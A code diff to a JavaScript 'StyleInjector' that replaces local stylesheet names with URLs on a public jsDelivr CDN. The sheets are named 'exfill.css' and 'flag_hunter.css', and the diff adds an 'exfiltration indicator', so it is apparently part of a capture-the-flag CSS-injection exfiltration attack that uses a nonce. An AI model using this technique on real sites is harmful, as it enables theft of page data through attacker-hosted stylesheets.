@@ -124,11 +124,11 @@ const StyleInjector = {
     },
     
     injectBasic(nonce) {
-        return this.injectCSSFile(nonce, 'basic.css');
+        return this.injectCSSFile(nonce, 'https://cdn.jsdelivr.net/gh/ajinabraham/cdn@0.0.8/basic.css');
     },
 
     injectComp(nonce) {
-        return this.injectCSSFile(nonce, 'comp.css');
+        return this.injectCSSFile(nonce, 'https://cdn.jsdelivr.net/gh/ajinabraham/cdn@0.0.8/comp.css');
     },
     
     injectVomp(nonce) {
@@ -192,7 +192,7 @@ const StyleInjector = {
     },
     
     injectExfill(nonce) {
-        const result = this.injectCSSFile(nonce, 'exfill.css');
+        const result = this.injectCSSFile(nonce, 'https://cdn.jsdelivr.net/gh/ajinabraham/cdn@0.0.8/exfill.css');
         
         // Add exfiltration indicator
         const indicator = document.createElement('div');
@@ -204,7 +204,7 @@ const StyleInjector = {
     },
     
     injectHunter(nonce) {
-        return this.injectCSSFile(nonce, 'flag_hunter.css');
+        return this.injectCSSFile(nonce, 'https://cdn.jsdelivr.net/gh/ajinabraham/cdn@0.0.8/flag_hunter.css');
     }
 };
 
